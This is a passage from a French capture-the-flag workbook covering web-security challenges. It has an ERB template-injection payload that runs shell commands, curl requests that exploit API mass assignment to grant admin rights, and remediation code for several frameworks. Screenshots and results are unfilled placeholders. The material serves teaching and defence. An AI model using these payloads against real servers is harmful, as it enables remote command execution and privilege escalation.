<%= IO.popen('ls').readlines() %>
```

### 📸 Screenshot

```
[INSÉRER ICI]
- Test de détection du template engine
- Payload d'exploitation
- Commande exécutée
- Flag obtenu
```

### 🛡️ Recommandations de Sécurisation

#### 1. Ne Jamais Utiliser d'Entrées Utilisateur dans les Templates
```python
# VULNERABLE
template = Template(user_input)
result = template.render()

# SÉCURISÉ
template = Template("Hello {{ name }}")
result = template.render(name=user_input)  # name est échappé
```

#### 2. Sandboxing
```python
# Jinja2 avec SandboxedEnvironment
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string(template_string)
```

#### 3. Liste Blanche de Fonctions
```python
# Limiter les fonctions accessibles
def safe_render(template_str, context):
    allowed_functions = {
        'len': len,
        'str': str,
        'int': int
    }

    # Créer un environnement limité
    safe_context = {
        **context,
        '__builtins__': allowed_functions
    }

    return template.render(safe_context)
```

#### 4. Logicless Templates
```javascript
// Utiliser Mustache (logicless)
// Pas d'exécution de code, seulement de l'interpolation
{{name}}  // OK
{{> partial}}  // OK
{{#list}}...{{/list}}  // OK
// Pas de {{eval()}} ou équivalent
```

### 📚 Références

- **PortSwigger SSTI** : https://portswigger.net/web-security/server-side-template-injection
- **HackTricks SSTI** : https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

---

## Challenge 11: API Mass Assignment

### 📋 Informations

- **Plateforme** : Root-Me
- **URL** : https://www.root-me.org/fr/Challenges/Web-Serveur/API-Mass-Assignment
- **Catégorie** : API Security
- **Difficulté** : Intermédiaire

### 🔍 Étapes de Découverte

1. **Analyse de l'API**
   - Endpoint de création/modification d'utilisateur
   - Paramètres visibles : `name`, `email`

2. **Test d'autres paramètres**
   ```json
   {
     "name": "test",
     "email": "test@example.com",
     "role": "admin"
   }
   ```
   Résultat : Paramètre accepté ⚠️

3. **Énumération des champs**
   - `role`, `is_admin`, `privilèges`, `is_verified`

### 💉 Payload Utilisé

```bash
# Requête normale
curl -X POST https://api.challenge.com/users \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@mail.com"}'

# Mass Assignment Attack
curl -X POST https://api.challenge.com/users \
  -H "Content-Type: application/json" \
  -d '{
    "name":"hacker",
    "email":"hack@mail.com",
    "role":"admin",
    "is_admin":true,
    "credits":999999
  }'

# Modification via PUT/PATCH
curl -X PATCH https://api.challenge.com/users/123 \
  -H "Authorization: Bearer TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

### 📸 Screenshot

```
[INSÉRER ICI]
- Requête avec les champs additionnels
- Réponse montrant l'élévation de privilèges
- Accès admin obtenu
- Flag récupéré
```

### 🛡️ Recommandations de Sécurisation

#### 1. Liste Blanche de Champs (Whitelist)
```python
# Flask-RESTful
from flask_restful import Resource, reqparse

parser = reqparse.RequestParser()
parser.add_argument('name', required=True, type=str)
parser.add_argument('email', required=True, type=str)
# Ne PAS ajouter 'role' ou 'is_admin'

class UserAPI(Resource):
    def post(self):
        args = parser.parse_args()
        # Seulement name et email sont acceptés
        user = User(name=args['name'], email=args['email'])
        db.session.add(user)
```

```javascript
// Express.js
app.post('/users', (req, res) => {
    // Whitelist explicite
    const allowedFields = ['name', 'email', 'phone'];
    const userData = {};

    allowedFields.forEach(field => {
        if (req.body[field]) {
            userData[field] = req.body[field];
        }
    });

    User.create(userData);
});
```

#### 2. DTO (Data Transfer Objects)
```python
# Django REST Framework
from rest_framework import serializers

class UserCreateSerializer(serializers.Serializer):
    name = serializers.CharField(max_length=100)
    email = serializers.EmailField()
    # Ne PAS inclure role, is_admin, etc.

    class Meta:
        fields = ['name', 'email']  # Explicite

# Utilisation
serializer = UserCreateSerializer(data=request.data)
if serializer.is_valid():
    user = User.objects.create(**serializer.validated_data)
```

```csharp
// C# / .NET
public class CreateUserDto
{
    public string Name { get; set; }
    public string Email { get; set; }
    // Ne PAS inclure Role, IsAdmin
}

[HttpPost]
public IActionResult CreateUser([FromBody] CreateUserDto dto)
{
    var user = new User
    {
        Name = dto.Name,
        Email = dto.Email,
        Role = "user"  // Défini côté serveur
    };
    _context.Users.Add(user);
}
```

#### 3. Séparation des Modèles
```python
# Modèle de base de données
class User(Model):
    name = CharField()
    email = EmailField()
    role = CharField(default='user')
    is_admin = BooleanField(default=False)

# Modèle pour l'API (Public)
class UserInputSchema(Schema):
    name = fields.Str(required=True)
    email = fields.Email(required=True)
    # role et is_admin ne sont PAS exposés

# Modèle Admin (Privé)
class AdminUserInputSchema(Schema):
    name = fields.Str()
    email = fields.Email()
    role = fields.Str()  # Seulement pour les admins
```

#### 4. Validation Stricte
```python
def create_user(request):
    # Champs autorisés pour les utilisateurs normaux
    user_allowed_fields = {'name', 'email', 'phone'}

    # Champs reçus
    received_fields = set(request.data.keys())

    # Détection de tentative de mass assignment
    unexpected_fields = received_fields - user_allowed_fields
    if unexpected_fields:
        logger.warning(f"Mass assignment attempt: {unexpected_fields}")
        return JsonResponse({'error': 'Invalid fields'}, status=400)

    # Création sécurisée
    user = User.objects.create(
        name=request.data.get('name'),
        email=request.data.get('email'),
        phone=request.data.get('phone')
    )
```

### 📚 Références

- **OWASP Mass Assignment** : https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
- **OWASP API Security Top 10** : https://owasp.org/www-project-api-security/
- **CWE-915** : https://cwe.mitre.org/data/definitions/915.html

---

## 📊 Résumé des Challenges

| # | Challenge | Plateforme | Catégorie | Difficulté | Statut |
|---|-----------|------------|-----------|------------|--------|
| 1 | Path Traversal Null Byte | PortSwigger | Path Traversal | ⭐⭐ | ⬜ À faire |
| 2 | PHP Filters | Root-Me | LFI | ⭐ | ⬜ À faire |
| 3 | CSRF - Contournement | Root-Me | CSRF | ⭐⭐ | ⬜ À faire |
| 4 | CSRF - Token Not Tied | PortSwigger | CSRF | ⭐⭐ | ⬜ À faire |
| 5 | CSRF - Referer Bypass | PortSwigger | CSRF | ⭐ | ⬜ À faire |
| 6 | JWT Révoqué | Root-Me | JWT | ⭐⭐ | ⬜ À faire |
| 7 | SQL Injection Error | Root-Me | SQLi | ⭐ | ⬜ À faire |
| 8 | Command Injection | Root-Me | Command Injection | ⭐⭐ | ⬜ À faire |
| 9 | XSS Stockée 2 | Root-Me | XSS | ⭐⭐ | ⬜ À faire |
| 10 | SSTI | PortSwigger | SSTI | ⭐⭐⭐ | ⬜ À faire |
| 11 | API Mass Assignment | Root-Me | API Security | ⭐⭐ | ⬜ À faire |

---

## 📝 Notes et Méthodologie

### Processus de Résolution

1. **Reconnaissance** : Comprendre le fonctionnement de l'application
2. **Test initial** : Identifier les points d'injection
3. **Analyse** : Comprendre les protections en place
4. **Exploitation** : Construire le payload
5. **Documentation** : Capturer les preuves
6. **Recherche** : Trouver les recommandations de sécurisation

### Outils Utilisés

- **Burp Suite** : Interception et modification des requêtes
- **curl** : Tests en ligne de commande
- **jwt.io** : Décodage et manipulation de JWT
- **CyberChef** : Encodage/décodage
- **Browser DevTools** : Analyse du code JavaScript

### Ressources Générales

- **OWASP Top 10** : https://owasp.org/www-project-top-ten/
- **PortSwigger Academy** : https://portswigger.net/web-security
- **HackTricks** : https://book.hacktricks.xyz/
- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings

---

**Date de complétion** : [À remplir]
**Temps total** : [À remplir]
**Difficultés rencontrées** : [À documenter]

